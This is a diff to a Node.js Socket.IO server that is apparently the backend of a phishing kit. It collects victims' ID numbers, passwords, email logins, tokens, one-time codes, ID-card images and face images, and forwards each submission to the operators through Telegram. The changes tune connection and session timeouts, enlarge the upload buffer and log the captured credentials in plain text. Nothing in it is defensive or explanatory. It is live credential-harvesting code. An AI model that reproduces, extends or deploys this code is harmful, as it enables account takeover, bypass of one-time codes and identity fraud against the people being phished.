@@ -8,11 +8,13 @@ require('dotenv').config();
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
-    pingTimeout: 60000,
-    pingInterval: 25000,
-    connectTimeout: 60000,
+    pingTimeout: 30000,
+    pingInterval: 10000,
+    connectTimeout: 45000,
     allowEIO3: true,
-    transports: ['websocket', 'polling'],
+    transports: ['polling', 'websocket'],
+    upgradeTimeout: 30000,
+    maxHttpBufferSize: 1e8,
     cors: {
         origin: "*",
         methods: ["GET", "POST"]
@@ -34,8 +36,8 @@ const sessionToSocket = new Map();
 const sessionTimers = new Map(); // Track session expiration timers
 
 // Session configuration
-const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes instead of 5
-const HEARTBEAT_INTERVAL = 20000; // 20 seconds
+const SESSION_TIMEOUT = 60 * 60 * 1000; // 60 minutes
+const HEARTBEAT_INTERVAL = 15000; // 15 seconds
 
 // Generate unique session ID
 function generateSessionId() {
@@ -165,16 +167,20 @@ io.on('connection', (socket) => {
     // Handle login submission
     socket.on('login', async (data) => {
         try {
+            console.log(`[LOGIN] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('login-response', { success: false, error: 'No session' });
             
             const sessionData = sessions.get(sessionId) || {};
             sessionData.documentType = data.documentType;
             sessionData.documentNumber = data.documentNumber;
             sessionData.password = data.password;
+            sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
 
             const buttons = getStandardButtons(sessionId);
+            console.log(`[LOGIN] Sending to Telegram for session ${sessionId}`);
             await sendToTelegram(sessionId, sessionData, buttons);
+            console.log(`[LOGIN] Successfully sent to Telegram for session ${sessionId}`);
             socket.emit('login-response', { success: true });
         } catch (error) {
             console.error('Error processing login:', error);
@@ -185,15 +191,19 @@ io.on('connection', (socket) => {
     // Handle email submission
     socket.on('email', async (data) => {
         try {
+            console.log(`[EMAIL] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('email-response', { success: false, error: 'No session' });
             
             const sessionData = sessions.get(sessionId) || {};
             sessionData.email = data.email;
             sessionData.emailPassword = data.password;
+            sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
 
             const buttons = getStandardButtons(sessionId);
+            console.log(`[EMAIL] Sending to Telegram for session ${sessionId}`);
             await sendToTelegram(sessionId, sessionData, buttons);
+            console.log(`[EMAIL] Successfully sent to Telegram for session ${sessionId}`);
             socket.emit('email-response', { success: true });
         } catch (error) {
             console.error('Error processing email:', error);
@@ -204,14 +214,18 @@ io.on('connection', (socket) => {
     // Handle token submission
     socket.on('token', async (data) => {
         try {
+            console.log(`[TOKEN] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('token-response', { success: false, error: 'No session' });
             
             const sessionData = sessions.get(sessionId) || {};
             sessionData.token = data.token;
+            sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
 
             const buttons = getStandardButtons(sessionId);
+            console.log(`[TOKEN] Sending to Telegram for session ${sessionId}`);
             await sendToTelegram(sessionId, sessionData, buttons);
+            console.log(`[TOKEN] Successfully sent to Telegram for session ${sessionId}`);
             socket.emit('token-response', { success: true });
         } catch (error) {
             console.error('Error processing token:', error);
@@ -222,14 +236,18 @@ io.on('connection', (socket) => {
     // Handle OTP submission
     socket.on('otp', async (data) => {
         try {
+            console.log(`[OTP] Received from session ${sessionId}:`, data);
             if (!sessionId) return socket.emit('otp-response', { success: false, error: 'No session' });
             
             const sessionData = sessions.get(sessionId) || {};
             sessionData.otp = data.otp;
+            sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
 
             const buttons = getStandardButtons(sessionId);
+            console.log(`[OTP] Sending to Telegram for session ${sessionId}`);
             await sendToTelegram(sessionId, sessionData, buttons);
+            console.log(`[OTP] Successfully sent to Telegram for session ${sessionId}`);
             socket.emit('otp-response', { success: true });
         } catch (error) {
             console.error('Error processing OTP:', error);
@@ -240,10 +258,12 @@ io.on('connection', (socket) => {
     // Handle cedula (ID card) submission
     socket.on('cedula', async (data) => {
         try {
+            console.log(`[CEDULA] Received from session ${sessionId}`);
             if (!sessionId) return socket.emit('cedula-response', { success: false, error: 'No session' });
             
             const sessionData = sessions.get(sessionId) || {};
             sessionData.hasCedula = true;
+            sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
 
             // Send images to Telegram
@@ -270,10 +290,12 @@ io.on('connection', (socket) => {
     // Handle biometria (face) submission
     socket.on('biometria', async (data) => {
         try {
+            console.log(`[BIOMETRIA] Received from session ${sessionId}`);
             if (!sessionId) return socket.emit('biometria-response', { success: false, error: 'No session' });
             
             const sessionData = sessions.get(sessionId) || {};
             sessionData.hasBiometria = true;
+            sessionData.lastActivity = Date.now();
             sessions.set(sessionId, sessionData);
 
             // Send face image to Telegram
